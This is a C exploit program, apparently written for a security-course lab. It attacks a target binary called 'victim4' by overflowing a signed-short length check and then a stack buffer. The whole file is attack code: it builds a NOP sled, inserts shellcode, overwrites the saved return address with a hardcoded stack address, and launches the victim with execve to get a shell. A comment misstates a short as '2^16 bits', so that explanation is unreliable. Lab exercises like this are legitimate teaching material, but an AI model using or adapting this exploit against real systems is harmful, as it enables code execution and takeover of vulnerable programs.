#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "shellcode.h"

int main(int argc, char *argv[])
{
  char *args[3];
  char *env[1];

  if (argc != 2) {
    fprintf(stderr, "Usage: %s /path/to/victim4\n", argv[0]);
    exit(EXIT_FAILURE);
  }

/*
Victim4 has a function that takes in a char* str and a short len

foo(char* arg, short arglen);	

That checks if arglen is < than the max of 4000
	If true it will run memcpy(buf,arg,strlen(arg));

A short is 2^16 bits which can be up towards 32_767
	If the input str has a size of 32_768 it will overflow the short
	to -32_768 causing the check to be valid and memcpy() the entire 
	buffer and overflow into the EIP.	

The exploit string only needs to overflow up to the EIP, where it will
execute our shell

*/

#define EXPLEN 32770	// Overflow for 'short int'
#define OVRFLW 4020	// Buffer + offset + address + NULL
#define BUFLEN 4000
  char exp_str[EXPLEN];

  // Assemble your exploit string here
  memset(exp_str, 0x90, EXPLEN-1); // Fill with NOP

  // Copy shellcode into end of exp_str - offset + NULL
  strcpy(exp_str + (OVRFLW - strlen(shellcode) - (OVRFLW - BUFLEN)), shellcode);
  
  // Remove NULL Term from shellcode
  *(unsigned long *)(exp_str + BUFLEN) = 0x90909090; 

  // Insert new EIP address to overflow to TODO: Find address
  *(unsigned long *)(exp_str + (OVRFLW - 4)) = 0xbfff6f82; // Point return address at exp_str
  
  exp_str[EXPLEN - 1] = 0; //NULL terminate

  args[0] = argv[1];
  args[1] = exp_str;
  args[2] = NULL;
  env[0] = NULL;

  if (execve(argv[1], args, env) < 0)
    err(EXIT_FAILURE, "Cannot execute %s", argv[1]);
  return EXIT_SUCCESS;
}
